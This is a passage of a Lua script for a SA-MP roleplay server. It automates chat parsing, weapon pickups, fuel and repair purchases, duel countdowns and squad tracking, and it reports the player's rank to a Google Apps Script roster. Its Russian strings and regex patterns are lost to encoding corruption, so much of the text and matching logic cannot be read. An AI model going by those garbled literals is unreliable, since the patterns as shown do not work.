							local re1 = regex.new("@@.@ Update complete @@..@.@") --
							local names = re1:match(responsetext)
							if names == nil then sampAddChatMessage("{FF0000}[LUA-exchane]: {FFFAFA}�� ������� �������� ��� � ������� ������.", 0xffff0000) else sampAddChatMessage("{FF0000}[LUA-exchange]: {FFFAFA}������� ��� � ������� ������.", 0xffff0000) end 
							sampAddChatMessage("{ff0000}[LUA-Exchange] {FFFAFA}����� �������� �� ����.")
							return 
						end
						A_Index = A_Index + 1
					end
				end)
				return false
			end
		end
	
		--- ����������� �������
		if text:match("��� �������������� ������� ������� ������� %'F6%' � ������� %'%/restoreAccess%'") ~= nil then -- ����� ����� � ����
			CTaskArr[10][4] = true
		end

		local s, sk = text:match("�� ������ (.*)%: (%d%d%d)%d%d%d%/%d+")
		if s ~= nil and s ~= "Army LV" then
			table.insert(CTaskArr[1], 7)
			table.insert(CTaskArr[2], os.time())
			table.insert(CTaskArr[3], s)
			CTaskArr[10][3] = sk
		end

		if (text:match("��������� ��������������%. � ��� �������� %d%/5 ���������� %������������%�") or text:match("� ��� ��� ��������� %������������%� ��� �������") ~= nil or text:match("� ������������ �������� ������") ~= nil or text:match("�� ������ �� ������������� ��������%. ��������� � ������") ~= nil) and CTaskArr[10][5] then CTaskArr[10][5] = false end
		---[16:57:04]  ����������: 10000/10000 -- �������� �� ��
		---[16:57:04]  �� ������� ������: 434418/500000

		---[17:02:42]  ����������: 0/10000 -- ��������� �� �������
		---[17:02:42]  �� ������ Army SF: 219080/300000

		---[17:06:06]  ����������: 0/10000 -- ��������� �� ��
		---[17:06:06]  �� ������ Army LV: 366329/500000
		if issquadactive[2] then -- �������� ����� ����� �����
			if col == -1 and text == " �������� ���������" then issquadactive[2] = false end
			if col == -1613968897 then local m = text:match("�� ������� (%d+) ����") if m ~= nil then issquadactive[2] = false issquadactive[3] = tonumber(m) end end
		end

		local date = text:match("�������� ���� ������� �� (.*)") -- ������� �� ��� ����
		if date ~= nil then
			local datetime = {}
			datetime.year, datetime.month, datetime.day = string.match(date,"(%d%d%d%d)%/(%d%d)%/(%d%d)")
			if math.floor((os.difftime(os.time(datetime), os.time())) / 3600 / 24) <= 7 then sampAddChatMessage("{FF0000}[LUA]: ��������!{FFFAFA} �� ����� ���� �������� ������ ������.", 0xffff0000) end
		end

		if not show.othervars.saccess then
			local rank = tonumber(text:match(" %a+%_%a+ �������%/������� ��c �� (%d+) �����")) -- �������������� ��������� ���� � �������
			if rank ~= nil then
				lua_thread.create(function()
					local result, myid = sampGetPlayerIdByCharHandle(PLAYER_PED)
					local mynick = sampGetPlayerNickname(myid)
					local arr = {[1] = "�������", [2] = "��������", [3] = "��. �������", [4] = "�������", [5] = "��. �������", [6] = "��������", [7] = "���������", [8] = "��. ���������", [9] = "���������", [10] = "��. ���������", [11] = "�������", [12] = "�����", [13] = "������������", [14] = "���������"}
					local f, s = mynick:match("(.*)%_(.*)")
					local nick = "" .. f .. " " .. s .. ""
					if arr[rank] == nil then sampAddChatMessage("{FF0000}[LUA-exchange]: {FFFAFA}�� ������� �������� ������ � ������� ������.", 0xffff0000) return end
					local r = translit(arr[rank])
					--https://script.google.com/macros/s/AKfycbwURDW5ngl2NOV52zplnjpmKKnhs8pBMUp0A_HZnnYbRXYA4yrH/exec?do=uprank&nick=Vladislav Reddle&rank=[[M]][[a]][[y`]][[o]][[r]]

					local url = 'https://script.google.com/macros/s/AKfycbwURDW5ngl2NOV52zplnjpmKKnhs8pBMUp0A_HZnnYbRXYA4yrH/exec?do=uprank&nick=' .. nick .. '&rank=' .. r .. ''
					local responsetext = req(url)
					local re1 = regex.new("@@.@ Update complete @@..@.@") --
					local names = re1:match(responsetext)
					if names == nil then sampAddChatMessage("{FF0000}[LUA-exchane]: {FFFAFA}�� ������� �������� ������ � ������� ������.", 0xffff0000) else sampAddChatMessage("{FF0000}[LUA-exchange]: {FFFAFA}������� ������ � ������� ������.", 0xffff0000) end 
					return 
				end)
			end

			local re1 = regex.new('([A-Za-z]+\\_[A-Za-z]+) ��������? ������� ����\\-������� ����� \\"�\\.�\\.�\\.�\\.\\" ����� ([A-Za-z]+) ([A-Za-z]+)') -- �������������� ��������� ������� � �������
			local f, s1, s2 = re1:match(text)
			if s1 ~= nil then
				lua_thread.create(function()
					local result, myid = sampGetPlayerIdByCharHandle(PLAYER_PED)
					local nick = sampGetPlayerNickname(myid)
					if nick == "" .. s1 .. "_" .. s2 .. "" and indexof(f, stroyarr.soptlist.ruk) then
						sampAddChatMessage("{FF0000}[LUA-exchange]: {FFFAFA}�������� ������ ��������� ������...", 0xffff0000)
						local responsetext = req('https://script.google.com/macros/s/AKfycbwURDW5ngl2NOV52zplnjpmKKnhs8pBMUp0A_HZnnYbRXYA4yrH/exec?do=auth&nick=' .. s1 .. '%20' .. s2 .. '') -- ����� ������� ����
						local re0 = regex.new("\\@\\@\\.\\@ (.*) \\@\\@\\.\\.\\@\\.\\@") --
						local access
						access = tonumber(re0:match(responsetext))
						if access == nil then sampAddChatMessage("{FF0000}[LUA-exchange]: {FFFAFA}����������� ������ ��� ���������� �������.", 0xffff0000) return end

						config_ini.UserClist[12] = access == 0 and "���������� ����� \"�.�.�.�.\"" or access ~= 6 and "������� �����-������� ����� \"�.�.�.�.\"" or "������� �����-������� ����� ��������� ����� \"�.�.�.�.\""
						PlayerU = access == 0 and "������ �.�.�.�." or access == 1 and "������ �.�.�.�." or access == 2 and "����������� ��������� �.�.�.�." or access == 3 and "�������� �.�.�.�." or access == 4 and "������� �.�.�.�." or access == 5 and "���� �.�.�.�." or (lvl == 1 and "������ �.�.�.�." or lvl == 2 and "����������� ��������� �.�.�.�." or lvl == 3 and "�������� �.�.�.�." or lvl == 4 and "������� �.�.�.�." or "���� �.�.�.�")
						tag = "|| �.�.�.�. ||"
						useclist = "12"
						sampAddChatMessage("{FF0000}[LUA-exchange]: {FFFAFA}������ ��������� ������ ������� ��������.", 0xffff0000)
					end
				end)
			end
		end
		
		if config_ini.bools[48] == 1 then
			local m = text:match("����������: (%d+)/10000")
			if m ~= nil then skipd[3][4] = tonumber(m) return end

			if skipd[3][5] then -- /mon
				local re0 = regex.new("(����|����|����|���|����� ��) ([0-9]+)/[0-9]+") --
				local fr, sk = re0:match(text)
				if fr ~= nil then
					local tarr = {["����"] = "LSPD", ["����"] = "LVPD", ["����"] = "SFPD", ["���"] = "FBI", ["����� ��"] = "SFA",}
					skipd[3][6][tarr[fr]] = math.floor(tonumber(sk)/1000)
					if tarr[fr] ~= "SFA" then return false end
					--���� - 102 | ���� - 110 | ���� - 112 | ��� - 130 | ��� - 235
					lua_thread.create(function() wait(600) sampSendChat("/f " .. tag .. " ���� - " .. skipd[3][6].LSPD .. " | ���� - " .. skipd[3][6].SFPD .. " | ���� - " .. skipd[3][6].LVPD .. " | ��� - " .. skipd[3][6].FBI .. " | ��� - " .. skipd[3][6].SFA .. "") end)
					skipd[3][5] = false
					return false
				end
			end
		end

		if config_ini.bools[50] == 1 then -- ����� ������ ����� � �����
			if text:match("������� �� ��������") or text:match("� ��� ������������ �����%!") then skipd[3][2] = 3 return end
		--	if text == " � ��� ��� �������� ����������" then skipd[3][2] = 1 return end
			if text == " � ��� ��� �����" and skipd[3][2] == 0 then skipd[3][2] = 1 return end
			if text == " � ��� ��� �����" and skipd[3][2] == 1 then skipd[3][2] = 2 return end
			if text:match(" ��� �����%(�%) ������������ (.*)%. �� ������������ ������") or text:match("��������� ��������������%. � ��� �������� %d%/%d+ ���������� %������������%�") and skipd[3][2] == 2 then skipd[3][2] = 0 end
		end

		if config_ini.bools[51] == 1 then -- ��������� ���������
			if text:match("������� .* ����� ��������������� ��� ���������� �� %d+ ����.*") then sampSendChat("/ac repair") return end
			local cost = tonumber(text:match("������� .* ����� ��������� ��� ���������� �� (%d+) ����.*"))
			if cost ~= nil then
				local ncost = tonumber(config_ini.dial[3])
				if ncost ~= nil and cost <= ncost then lua_thread.create(function() wait(600) sampSendChat("/ac refill") end) return end
			end
		end

		local regexes = {}
		local localvars = {}
		if config_ini.bools[41] == 1 then -- �����
			local offid = text:match("%[����������%] %a+_%a+%[(%d+)%] %{D95A41%}����������")
			local fname, sname, onid = text:match("%[����������%] (%a+)_(%a+)%[(%d+)%] (.*) %{00AB06%}�����������")
			local connect = text:match("�� ������������ � ����������")
			local uninv = text:match("%[����������%] %a+%_%a+%[%d+%] %{C42100%}������%{9FCCC9%} (.*) �� ����������")
			local unme = text:match("%a+%_%a+% ������ ��� �� ���������� %'.*%'")
			local disconnect = text:match("�� ����������� �� ����������")
			local fsfn, fssn, racid, sq = text:match("%[�����%] (%a+)_(%a+)%[(%d+)%] .*: (.*)")
			if unme ~= nil or disconnect ~= nil then rCache = {enable = false, squaddata = {}, smem = {}} return end
			
			if connect ~= nil then lua_thread.create(function() findsquad() end) end
			
			if uninv ~= nil then
				lua_thread.create(function()
					local id = -1
					for k, v in pairs(rCache.smem) do if v.name == uninv then id = k break end end
					if id ~= -1 then rCache.smem[tonumber(id)] = nil end
				end)
			end
			
			if offid ~= nil then 
				rCache.smem[tonumber(offid)] = nil
			end
		
			if onid ~= nil then
				id = tonumber(onid)
				clist = string.sub(string.format('%x', sampGetPlayerColor(id)), 3)
				clist = clist == "ffff" and "fffafa" or clist
						
				rCache.smem[id] = {["name"] = "" .. fname .. "_" .. sname .. "", ["color"] = clist, ["colorns"] = "" .. clist .. "99", ["time"] = 0}
			end
			
			if sq ~= nil then 
				local rrid = tonumber(racid)

				if rCache.smem[rrid] == nil then 
					local clist = string.sub(string.format('%x', sampGetPlayerColor(rrid)), 3)
					local clist = clist == "ffff" and "fffafa" or clist		
					rCache.smem[rrid] = {["name"] = "" .. fsfn .. "_" .. fssn .. "", ["color"] = clist, ["colorns"] = "" .. clist .. "99", ["time"] = 0}
				end

				local col = "0x" .. config_ini.squadset[1] .. "FF" -- �����/���� � ��
				local off1 = sq:match("sq%_message%_id%_1%_(%d+)")
				local off2 = sq:match("sq%_message%_id%_2") 
				if off1 ~= nil then					
					rCache.smem[rrid].time = tonumber(off1) + (3600 * tonumber(config_ini.Settings.timep))
					return false 
				end

				if off2 ~= nil then rCache.smem[tonumber(racid)].time = 0 return false end

				return {col, text} 
			end
		end
			
		local re0 = regex.new("(�������|��������|��.�������|�������|��.�������|��������|���������|��.���������|���������|��.���������|�������|�����|������������|���������|�������)  (.*)\\_(.*)\\[([0-9]+)\\]\\: (.*)") --
		local z, fn, sn, id, txt = re0:match(text)
		if txt ~= nil and col == -1920073729 then
			if config_ini.bools[35] == 1 then
				if memb_ini.players["" .. fn .. "_" .. sn .. ""] ~= z then
					sampDestroy3dText(2048 - tonumber(id))
					memb_ini.players["" .. fn .. "_" .. sn .. ""] = z
					sampCreate3dTextEx(2048 - tonumber(id), memb_ini.players["" .. fn .. "_" .. sn .. ""], 0xffFFFAFA, 0, 0, 0.4, 22, false, tonumber(id), -1)
					lua_thread.create(function() inicfg.save(memb_ini, "members") end)
				end
			end

			if not stroyarr.stroycreator then
				local re1 = regex.new("�.�.�.�., ���������� � ��������!") -- ����� ����
				if re1:match(txt) then stroyarr.stroymode, stroyarr.stroystate, stroyarr.creator.id, stroyarr.creator.zv = true, 0, tonumber(id), indexof(z, ranksnames) end
			end
				
			if not stroyarr.stroymode then
				local re1 = regex.new("([�-��-�]�������� �����������[�-��-�]|[S|s|C|c|�|�][O|o|�|�][S|s|C|c|�|�]|[�-��-�]���(���[�-��-�]|�[�-��-�]?)) .*([A-Z�-��-�a-z][\\s, \\-][0-9]+)(\\s?)") -- ����� ����
				local _, _, kv = re1:match(txt)
				if kv ~= nil then
					table.insert(CTaskArr[1], 1)
					table.insert(CTaskArr[2], os.time())
					table.insert(CTaskArr[3], kv)
				end

				local re2 = regex.new("[�|�]�������[�-��-�].*([A-Z�-��-�a-z]+\\s?-?[0-9]+)(\\s?)") -- ����� ���������
				local _1, _2, _3, kv = re2:match(txt)
				if kv ~= nil then
					table.insert(CTaskArr[1], 2)
					table.insert(CTaskArr[2], os.time())
					table.insert(CTaskArr[3], kv)
				end

				
				if txt:match("�������� ���") ~= nil and isCharInArea2d(PLAYER_PED, -84, 1606, 464, 2148, false) then
					local idc = isCharInAnyCar(PLAYER_PED) and getCarModel(storeCarCharIsInNoSave(PLAYER_PED)) or -1
					if idc ~= 433 then
						lua_thread.create(function() 
							local A_Index = 0
							while true do
								if A_Index == 20 then break end
								local text = sampGetChatString(99 - A_Index)
				
								local re1 = regex.new("[�-��-�]+(���|���|������|��)[�-��-�].*((([�-��-�]�����[�-��-�]|(P|p|�|�)olise)\\s?)?((�|�|L|l|C|c|�|�)(C|c|�|�|S|s|�|�|V|v)|(C|c|�|�|s|S)(�|�|F|f))|(F|f|�|�)(B|b|�|�|�|�)(I|i|�|�|�|�)|(S|s|�|�|C|c)(A|a|�|�)(N|n|�|�|H|h)[\\s,\\-,\\_]?(F|f|�|�)(i|I|�|�)(�|�|E|e)(P|p|�|�|r|R)(P|p|�|�|r|R)?(O|o|�|�)|(L|l|�|�)(o|O|�|�)(�|�|C|c|S|s)[\\s,\\-,\\_]?(�|�|C|c|S|s)(A|a|�|�)(N|n|�|�)(t|T|�|�)(O|o|�|�)(�|�|C|c|S|s)|(L|l|�|�)(A|a|�|�)(S|s|�|�|C|c)[\\s,\\-,\\_]?(V|v|�|�|b|B)(�|�|E|e)(N|n|�|�)(t|T|�|�)(U|u|�|�|Y|y)(P|p|�|�|r|R)(A|a|�|�)(S|s|�|�|C|c))")
								local _, p = re1:match(text)
								if p ~= nil then
									local reLS = regex.new("(((([�-��-�]�����[�-��-�]|(P|p|�|�)olise)\\s?)?((�|�|L|l)(C|c|�|�|S|s)))|(L|l|�|�)(o|O|�|�)(�|�|C|c|S|s)[\\s,\\-,\\_]?(�|�|C|c|S|s)(A|a|�|�)(N|n|�|�)(t|T|�|�)(O|o|�|�)(�|�|C|c|S|s))")
									local reSF = regex.new("(((([�-��-�]�����[�-��-�]|(P|p|�|�)olise)\\s?)?((C|c|�|�|s|S)(�|�|F|f)))|(F|f|�|�)(B|b|�|�|�|�)(I|i|�|�|�|�)|(S|s|�|�|C|c)(A|a|�|�)(N|n|�|�|H|h)[\\s,\\-,\\_]?(F|f|�|�)(i|I|�|�)(�|�|E|e)(P|p|�|�|r|R)(P|p|�|�|r|R)?(O|o|�|�))")
									local reLV = regex.new("(((([�-��-�]�����[�-��-�]|(P|p|�|�)olise)\\s?)?((�|�|L|l)(�|�|V|v)))|(L|l|�|�)(A|a|�|�)(S|s|�|�|C|c)[\\s,\\-,\\_]?(V|v|�|�|b|B)(�|�|E|e)(N|n|�|�)(t|T|�|�)(U|u|�|�|Y|y)(P|p|�|�|r|R)(A|a|�|�)(S|s|�|�|C|c))")
									local pp = reLS:match(p) ~= nil and "�� �. Los-Santos" or reSF:match(p) ~= nil and "�� �. San-Fierro" or reLV:match(p) ~= nil and "�� �. Las-Venturas" or ""
									table.insert(CTaskArr[1], 4)
									table.insert(CTaskArr[2], os.time())
									table.insert(CTaskArr[3], pp)
									return 
								end
								A_Index = A_Index + 1
							end
						end)
					end
				end
			else
				local result, myid = sampGetPlayerIdByCharHandle(PLAYER_PED)
				local mynick = sampGetPlayerNickname(myid)
				local nick = fn .. "_" .. sn
				if ((not stroyarr.stroycreator and id ~= stroyarr.creator.id) or (stroyarr.stroycreator)) and (mynick ~= nick) then
					local re4 = regex.new("\\|\\| �\\.�\\.�\\.�\\. \\|\\| �������\\!")
					local res = re4:match(txt)
					if res ~= nil and stroyarr.stroystate < 2 then
						local z_index = indexof(z, ranksnames)
						local id = tonumber(id)
						local tempbool = false
						if indexof(nick, stroyarr.soptlist.ruk) ~= false then tempbool = true insertruk(id, z_index) end
						if indexof(nick, stroyarr.soptlist.osn) ~= false then tempbool = true insertosn(id, z_index) end
						if indexof(nick, stroyarr.soptlist.stj) ~= false then tempbool = true insertstj(id, z_index) end
											
						if tempbool then
							if stroyarr.stroyleader.current == "" or stroyarr.stroyleader.current ~= stroyarr.stroypr.ids[1] then 
								local temp = stroyarr.stroyleader.current ~= "" and stroyarr.stroyleader.current or ""
								local result, myid = sampGetPlayerIdByCharHandle(PLAYER_PED)
								if temp ~= "" then sampAddChatMessage("{FF0000}[LUA]: {fffafa}����� �������� � ����� ���� ������ ������ �������.", 0x00FFFAFA) end
													
								stroyarr.stroyleader.current = stroyarr.stroypr.ids[1]
								if stroyarr.stroyleader.current == myid then 
									sampAddChatMessage("{FF0000}[LUA]: {fffafa}�� ���� ��������� ������� �� ����������.", 0x00FFFAFA)
									stroyarr.stroystate = 1
								else
									sampAddChatMessage("{FF0000}[LUA]: {fffafa}����� " .. sampGetPlayerNickname(stroyarr.stroypr.ids[1]) .. " [" .. tostring(stroyarr.stroypr.ids[1]) .. "] ��� �������� ������� �� ����������.", 0x00FFFAFA)
								end
							end
						end
					end
				end
			end

			if config_ini.bools[40] == 1 then -- ������� �� ���������� ���� � �����
				local re3 = regex.new("(" .. config_ini.warnings[1] .. "|" .. config_ini.warnings[2] .. "|" .. config_ini.warnings[3] .. "|" .. config_ini.warnings[4] .. ")")
				local res = re3:match(txt)
				if res ~= nil then sampAddChatMessage("{FF0000}[LUA]: ��������! {FFFAFA}" .. z .. " " .. fn .. "_" .. sn .. "[" .. id .. "] �������� ���� � �����!", 0xFFFF0000) end
			end

			if config_ini.bools[39] == 1 then -- ��������� ���� � ����� (������ ���� ����� ���������)
				local clist = string.sub(string.format('%x', sampGetPlayerColor(id)), 3)
				clist = clist == "ffff" and "fffafa" or clist
				sampAddChatMessage(" {8470FF}" .. z .. " {" .. clist .. "}" .. fn .. "_" .. sn .. "[" .. id .. "]{8470FF}: " .. txt .. "", 0xFF8470FF)
				return false
			end
		end

		if not duel.mode then
			local myid = select(2, sampGetPlayerIdByCharHandle(PLAYER_PED))
			local myn, myf = sampGetPlayerNickname(myid):match("(.*)%_(.*)")
			local f, n = text:match(" (.*)%_(.*) ������.? �������� ��� ���� " .. myn .. " " .. myf .. "")
			if f == nil then return end
			local nick = "" .. f .. "_" .. n .. ""
			local id = sampGetPlayerIdByNickname(nick)
			if f ~= nil then
				duel.mode = true
				duel.en.id = id
				lua_thread.create(function()
					sampAddChatMessage("{FF0000}[LUA]: {fffafa}" .. nick .. "[" .. id .. "] �������� ��� �� �����. ������� Y ��� �������� � N ��� ������", 0x00FFFAFA)
					while true do wait(0) if isKeyDown(vkeys.VK_Y) then break end if isKeyDown(vkeys.VK_N) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����������� ���������.", 0xFFFF0000) sampSendChat("/me ��������" .. RP .. " �� ��������� ��������") duel.mode = false duel.en = -1 return end end
					if not duel.mode then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� ��������.", 0xFFFF0000) duel.mode = false duel.en.id = -1 return end

					duel.fightmode = true
					duel.en.hp = sampGetPlayerHealth(id)
					duel.en.arm = sampGetPlayerArmor(id)
					duel.my.hp = sampGetPlayerHealth(myid)
					duel.my.arm = sampGetPlayerArmor(myid)
					local abc = ((duel.en.hp ~= duel.my.hp) or (duel.my.arm ~= duel.en.arm)) and "�������� �����" or "�����"
					sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����������� �������. ������� ������", 0xFFFF0000)
					sampSendChat("/me ������" .. RP .. " ��������� ��������")
					wait(1300)
					sampSendChat("/do *����� �����*: \"".. abc .. ": " .. myn .. " " .. myf .. " vs " .. f .. " " .. n .. " �������� ����� 3!\"")
					math.randomseed(os.time())
					local A_Index = 1

					while true do
						wait(0)
						local myHP = sampGetPlayerHealth(myid)
						local myARM = sampGetPlayerArmor(myid)
						local enHP = sampGetPlayerHealth(id)
						local enARM = sampGetPlayerArmor(id)

						if myHP ~= duel.my.hp or enHP ~= duel.en.hp or myARM ~= duel.my.arm or enARM ~= duel.en.arm then 
							wait(600)
							sampSendChat("/do *����� �����*: \"���������! ����� ��������!\"")
							duel.mode = false
							duel.en.id = -1
							duel.fightmode = false
							return
						end

						wait(1000)
						local delay = math.random(1, 3)
						wait(4000 - delay * 1000)
						sampSendChat("/do *����� �����*: \"" .. (A_Index == 1 and "2!" or A_Index == 2 and "1!" or "GO!") .. "\"")
						if A_Index == 3 then break end
						A_Index = A_Index + 1
					end

					while true do
						wait(0)
						local myHP = sampGetPlayerHealth(myid)
						local enHP = sampGetPlayerHealth(id)
						if myHP <= 12 or enHP <= 12 then 
							sampSendChat("/do *����� �����*: \"".. abc .. " ��������! ���������� - " .. (myHP <= 12 and "".. f .. " " .. n .. "" or "" .. myn .. " " .. myf .. "") .. "!\"")
							duel.mode = false
							duel.en.id = -1
							duel.fightmode = false
							return
						end
					end
				end) 
			end
		end

		if duel.mode and not duel.fightmode then
			local f, n = text:match( "" .. sampGetPlayerNickname(duel.en.id) .. " ��������.? �� ��������� ��������")
			if f ~= nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����������� ���������.", 0xFFFF0000) duel.mode = false duel.en.id = -1 return end
			local f2, n2 = text:match( "" .. sampGetPlayerNickname(duel.en.id) .. " ������.? ��������� ��������")
			if f2 ~= nil then 
				duel.fightmode = true
				lua_thread.create(function()
					local myid = select(2, sampGetPlayerIdByCharHandle(PLAYER_PED))
					local id = duel.en.id
					while true do
						wait(0)
						if not duel.mode then return end
						local myHP = sampGetPlayerHealth(myid)
						local enHP = sampGetPlayerHealth(id)
						if myHP <= 12 or enHP <= 12 then
							duel.mode = false
							duel.en.id = -1
							duel.fightmode = false
							break
						end
					end
				end)
			end
		end
end

function ev.onSetPlayerColor(id, color)
	if rCache.enable and rCache.smem[id] ~= nil and config_ini.bools[41] == 1 then
		local clist = ("%06x"):format(bit.band (bit.rshift(color, 8), 0xFFFFFF)) 
		local clist = clist == "ffff" and "fffafa" or clist
		rCache.smem[id].color = clist
		rCache.smem[id].colorns = "" .. clist .. "99"
	end
end

function join_argb(a, r, g, b)
   local argb = b  -- b
   argb = bit.bor(argb, bit.lshift(g, 8))  -- g
   argb = bit.bor(argb, bit.lshift(r, 16)) -- r
   argb = bit.bor(argb, bit.lshift(a, 24)) -- a
   return argb
 end

 function explode_argb(argb)
   local a = bit.band(bit.rshift(argb, 24), 0xFF)
   local r = bit.band(bit.rshift(argb, 16), 0xFF)
   local g = bit.band(bit.rshift(argb, 8), 0xFF)
   local b = bit.band(argb, 0xFF)
   return a, r, g, b
 end

function ev.onPlayerChatBubble(playerId, color, distance, duration, message)
	if config_ini.bools[15] == 1 and (message == "��������� ��������" or message == "���������� ��������") then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� " .. sampGetPlayerNickname(playerId) .. "[" .. playerId .. "] - ��������� ��������", 0xFFFF0000) end
end

--[ML] (script) Binder for CO by Belka version 1.41.lua: 2048   Sergey_Reddle - Desert Eagle +47.0
--[ML] (script) Binder for CO by Belka version 1.41.lua: 2049   Sergey_Reddle - Desert Eagle +47.0

function findsquad()
	--rCache.font = renderCreateFont("Trebuc", 9, FCR_BORDER + FCR_BOLD)
	rCache = {enable = false, squaddata = {}, smem = {}}
	for i = 0, 2303 do
		if sampTextdrawIsExists(i) and sampTextdrawGetString(i):find("SQUAD") then
			sampTextdrawSetPos(i, 1488, 1488)
			--local x, y = sampTextdrawGetPos(i)
			--rCache.pos.x, rCache.pos.y = convertGameScreenCoordsToWindowScreenCoords(x == 1488 and x - 1485 or x + 1, y == 1488 and y - 1341 or y - 50)
			local list = sampTextdrawGetString(i):split("~n~")
			table.remove(list, 1)
			for k, v in ipairs(list) do
				wait(0)
				local id = sampGetPlayerIdByNickname(v)
				if id then
					local clist = string.sub(string.format('%x', sampGetPlayerColor(id)), 3)
					local clist = clist == "ffff" and "fffafa" or clist
						
					rCache.smem[id] = {["name"] = v, ["color"] = clist, ["colorns"] = "" .. clist .. "99", ["time"] = 0}
				end
			end
			rCache.enable = true
			break
        end
		
		
    end
end

function ev.onCreate3DText(id, color, position, distance, testLOS , attachedPlayerId, attachedVehicleId, text)
	lua_thread.create(function() 
		if config_ini.bools[53] == 1 then
			local cen = tonumber(text:match("���� �� 200�%: %$(%d+)"))
			if cen ~= nil then
				local ncost = tonumber(config_ini.dial[4])
				if ncost ~= nil and cen <= ncost then
					sampSendChat("/get fuel")
					if isCharInAnyCar(PLAYER_PED) and getDriverOfCar(storeCarCharIsInNoSave(PLAYER_PED)) == PLAYER_PED then skipd[3][7][1] = true skipd[3][7][2] = id end
				end
			end
		end
	end)
	return
end

function ev.onRemove3DTextLabel(id)
	if skipd[3][7][1] and id == skipd[3][7][2] then skipd[3][7][1] = false end
end

function ev.onShowDialog(dialogid, style, title, button1, button2, text)
		--print(dialogid, style, title, button1, button2, text)
		if dialogid == 245 and title == "����� ������" then
				istakesomeone = false
				if AutoDeagle then
					local a = getAmmoInCharWeapon(PLAYER_PED, 24)
					if a <= 21 then sampSendDialogResponse(dialogid, 1, 0, "") istakesomeone = true isdeagletaken = true return false end
				end

				if AutoShotgun then
					local a = getAmmoInCharWeapon(PLAYER_PED, 25)
					if a <= 30 then sampSendDialogResponse(dialogid, 1, 1, "") istakesomeone = true isshotguntaken = true return false end
				end

				if AutoSMG then
					local a = getAmmoInCharWeapon(PLAYER_PED, 29)
					if a <= 90 then sampSendDialogResponse(dialogid, 1, 2, "") istakesomeone = true issmgtaken = true return false end
				end

				if AutoM4A1 then
					local a = getAmmoInCharWeapon(PLAYER_PED, 31)
					if a <= 150 then sampSendDialogResponse(dialogid, 1, 3, "") istakesomeone = true ism4a1taken = true return false end
				end

				if AutoRifle then
					local a = getAmmoInCharWeapon(PLAYER_PED, 33)
					if a <= 30 then sampSendDialogResponse(dialogid, 1, 4, "") istakesomeone = true isrifletaken = true return false end
				end

				if AutoPar then
					local a = getAmmoInCharWeapon(PLAYER_PED, 46)
					if a ~= 1 then sampSendDialogResponse(dialogid, 1, 6, "") istakesomeone = true ispartaken = true return false end
				end

				if not isarmtaken then sampSendDialogResponse(dialogid, 1, 5, "") istakesomeone = true isarmtaken = true return false end

				if not istakesomeone then
						if AutoOt then
							 	local otsrt = ""
								if isarmtaken then otsrt = "����������" end
								if isdeagletaken then otsrt = otsrt == "" and "Desert Eagle" or "" .. otsrt .. ", Desert Eagle" end
								if isshotguntaken then otsrt = otsrt == "" and "Shotgun" or "" .. otsrt .. ", Shotgun" end
								if issmgtaken then otsrt = otsrt == "" and "HK MP-5" or "" .. otsrt .. ", HK MP-5" end
								if ism4a1taken then otsrt = otsrt == "" and "M4A1" or "" .. otsrt .. ", M4A1" end
								if isrifletaken then otsrt = otsrt == "" and "Country Rifle" or "" .. otsrt .. ", Country Rifle" end
								if ispartaken then otsrt = otsrt == "" and "�������" or "" .. otsrt .. ", �������" end
								if otsrt ~= "" then sampSendChat("/me ����" .. RP .. " �� ������ " .. otsrt .. "") end
						end
						sampCloseCurrentDialogWithButton(0)
						isarmtaken, isdeagletaken, isshotguntaken, issmgtaken, ism4a1taken, isrifletaken, ispartaken, istakesomeone, whatwastaken = false, false, false, false, false, false, false, false, {}
						if config_ini.bools[46] == 1 and skipd[1].pid == skipd[2][6] then sampSendPickedUpPickup(skipd[2][5]) end
						return false
				end
		end

		if dialogid == 22 then
			if refmem1.status and title == "������ ������" then
				refmem1.text = text
				return false
			elseif otmmode and title == "������ �������" then
				local list = text:split("\n")
				for k, v in ipairs(list) do
					local nick, rank, auth, online, onlineall = v:match("%[%d+%] (%a+_%a+) 	(%d+) 	(%d+/%d+/%d+ %d+:%d+:%d+) 	(%d+) / (%d+) �����")
					if nick and rank and auth and soptlist[1][nick] ~= nil then
						soptlist[1][nick] = onlineall
					end
				end
			
				if text:find(">> ����.��������", 1, true) then
					lua_thread.create(function() wait(1000) sampSendDialogResponse(22, 1, 40, '>> ����.��������') end)
				else
					otmmode = false
				end
				
				return false
			else end
		end
		
		if config_ini.bools[45] == 1 and dialogid == 288 and text:match("1 ����: ����") then
			if skipd[1].pid == skipd[2][2] and skipd[1].obool and not show.othervars.saccess then --2213
				sampSendDialogResponse(dialogid, 1, 1, "")
				sampCloseCurrentDialogWithButton(0)
				return false
			elseif skipd[1].pid == skipd[2][3] or skipd[1].pid == skipd[2][4] then -- 2213 - 2214
				sampSendDialogResponse(dialogid, 1, 0, "")
				sampCloseCurrentDialogWithButton(0)
				return false
			end		
		end

		if config_ini.bools[49] == 1 then -- ������� ������� ��������
			if dialogid == 22 and style == 0 and title == "���������" and button1 == "�������" and button2 == "�����" then 
				local val = tonumber(text:match("��������� ������� (%d+) ����"))
				if val ~= nil then
					local ncost = tonumber(config_ini.dial[1])
					if ncost ~= nil and val <= ncost then skipd[3][1] = true sampSendDialogResponse(dialogid, 1, 0, "") sampCloseCurrentDialogWithButton(0) return false end
				end
			end

			if dialogid == 22 and style == 2 and title == "��������" and button1 == "�������" and button2 == "�����" and skipd[3][1] then skipd[3][1] = false sampCloseCurrentDialogWithButton(0) return false end
		end

		if config_ini.bools[50] == 1 and dialogid == 16 and style == 4 and title == "������� 24/7" and button1 == "������" and button2 == "������" then -- ������� ������� 24/7
			if skipd[3][2] == 3 then sampSendDialogResponse(dialogid, 0, 1, "") sampCloseCurrentDialogWithButton(0) skipd[3][2] = 1 return false end
			
			if skipd[3][2] == 0 then
				local val = tonumber(text:match("�������� %������������%�	%[%$(%d+)%]"))
				if val ~= nil then
					local ncost = tonumber(config_ini.dial[2])
					if ncost ~= nil and val <= ncost then sampSendDialogResponse(dialogid, 1, 8, "") sampCloseCurrentDialogWithButton(0) return false end
				end
			end

			if skipd[3][2] == 1 then
				local val = tonumber(text:match("������ �� �����������	%[%$(%d+)%]"))
				if val ~= nil then
					local ncost = tonumber(config_ini.dial[2])
